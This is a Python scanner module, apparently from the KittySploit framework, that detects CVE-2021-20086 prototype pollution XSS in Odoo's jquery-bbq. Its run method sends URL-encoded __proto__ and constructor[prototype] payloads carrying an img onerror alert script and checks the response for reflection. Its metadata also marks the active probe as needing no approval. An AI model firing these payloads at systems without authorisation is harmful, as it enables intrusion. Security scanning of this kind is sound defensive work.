#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""jquery-bbq 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Odoo Apps - Cross-Site Scripting via Prototype Pollution Detection',
        'description': 'jquery-bbq 1.2.1 contains a prototype pollution caused by improperly controlled modification of object prototype attributes, letting malicious users inject properties into Object.prototype, exploit requires malicious user interaction.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'odoo', 'xss', 'proto', 'jquery', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.tenable.com/security/research/tra-2022-10',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-20086',
        ],
        'cve': 'CVE-2021-20086',
    }

    def run(self):
        for path in ('/?__proto__%5Bcontext%5D=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E&__proto__%5Bjquery%5D=x', '/?constructor%5Bprototype%5D%5Bcontext%5D=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E&constructor%5Bprototype%5D%5Bjquery%5D=x'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_any = ('debug:',)
            body_all = ('alert(document.domain)', 'var odoo =',)
            if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
                self.set_info(
                    severity='high',
                    reason="Odoo Apps - Cross-Site Scripting via Prototype Pollution detected",
                    path=path,
                )
                return True
        return False

